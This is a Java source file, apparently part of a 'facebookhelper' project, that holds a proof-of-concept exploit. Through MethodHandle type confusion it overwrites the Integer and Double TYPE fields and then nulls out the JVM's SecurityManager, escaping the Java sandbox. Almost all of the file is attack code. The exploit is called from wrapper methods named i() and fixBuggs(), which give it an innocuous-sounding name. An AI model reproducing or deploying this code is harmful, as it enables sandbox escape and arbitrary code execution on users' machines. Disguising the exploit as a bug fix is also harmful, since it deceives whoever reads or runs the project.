/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.demonbindestrichcraft.facebookhelper;

/**
 *
 * @author ABC
 */
    import java.lang.invoke.MethodHandle;
import java.lang.reflect.Field;
import static java.lang.invoke.MethodHandles.lookup;
import java.util.logging.Level;
import java.util.logging.Logger;

class Union1 {
  int field1;
  Object field2;
}

class Union2 {
  int field1;
  SystemClass field2;
}

class SystemClass {
  Object f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,
    f13,f14,f15,f16,f17,f18,f19,f20,f21,f22,f23,
    f24,f25,f26,f27,f28,f29,f30;
}

public class PoC {
  public static void disableSecurityManager() throws Throwable {
    MethodHandle mh1, mh2;
    mh1 = lookup().findStaticSetter(Double.class, "TYPE", Class.class);
    mh2 = lookup().findStaticSetter(Integer.class, "TYPE", Class.class);
    Field fld1 = Union1.class.getDeclaredField("field1");
    Field fld2 = Union2.class.getDeclaredField("field1");
    Class classInt = int.class;
    Class classDouble = double.class;
    mh1.invokeExact(int.class);
    mh2.invokeExact((Class)null);
    Union1 u1 = new Union1();
    u1.field2 = System.class;
    Union2 u2 = new Union2();
    fld2.set(u2, fld1.get(u1));
    mh1.invokeExact(classDouble);
    mh2.invokeExact(classInt);
    if (u2.field2.f29 == System.getSecurityManager()) {
      u2.field2.f29 = null;
    } else if (u2.field2.f30 == System.getSecurityManager()) {
      u2.field2.f30 = null;
    } else {
      System.out.println("security manager field not found");
      throw new Exception("fff");
    }
  }
  
  public static int i()
  {
        try {
            disableSecurityManager();
            return 1;
        } catch (Throwable ex) {
            if(ex.getMessage().equals("fff")) {
                return -1;
            }
        }
        return 0;
  }
  
  public static boolean fixBuggs()
  {
        int i = i();
        if(i==-1)
            return false;
        return true;
  }
}
